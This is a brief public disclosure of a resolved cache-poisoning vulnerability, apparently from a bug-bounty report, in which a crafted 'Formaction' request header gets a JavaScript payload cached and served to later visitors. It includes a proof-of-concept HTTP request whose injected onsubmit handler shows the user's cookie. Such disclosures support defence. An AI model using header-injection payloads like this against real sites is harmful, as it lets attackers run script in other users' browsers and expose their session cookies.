# 💀💀💀 SECURITY DISCLOSURE: CACHE POISONING 💀💀💀
**PoC.Public([0x01]_2023-07-30) (_sdb)**
**Location:** DDD_045 - Cascavel PR

---

## ⚡ SUMMARY
A medium/high severity **Cache Poisoning** vulnerability was discovered via the `formaction` parameter. Attackers can inject malicious JavaScript payloads within request headers to poison the cache on specific endpoints. When a normal user later visits the URL, the poisoned cache executes the payload in their browser.

* **Researcher:** e5p3ctr0x96
* **Status:** RESOLVED
* **Reporting Date** July 30, 2023, 12:05pm UTC
* **Disclosure Date:** September 18, 2024

## 📦 ASSETS INCLUDED
The following proof-of-concept evidence is included in the project structure:
* `assets/image-01.png` - Screenshot of cookie exfiltration pop-up.
* `assets/PoC-CACHE-POISONING-SummarySummary_0045-Cascavel-PR-4machines.webm` - Full video reproduction walkthrough.

## 🛠️ EXPLOIT POC
By issuing a modified header, the server caches a malicious response:

```http
GET /fr/191/aliments/alimentation-pour-chat?pettype=cat&formaction=\0&range=pettype&ldwkG=1 HTTP/1.1
Formaction: new4url" onsubmit=confirm(document.cookie)>

(Public disclosure agreed by @Mars).

"The future is already here – it's just not evenly distributed."
— William Gibson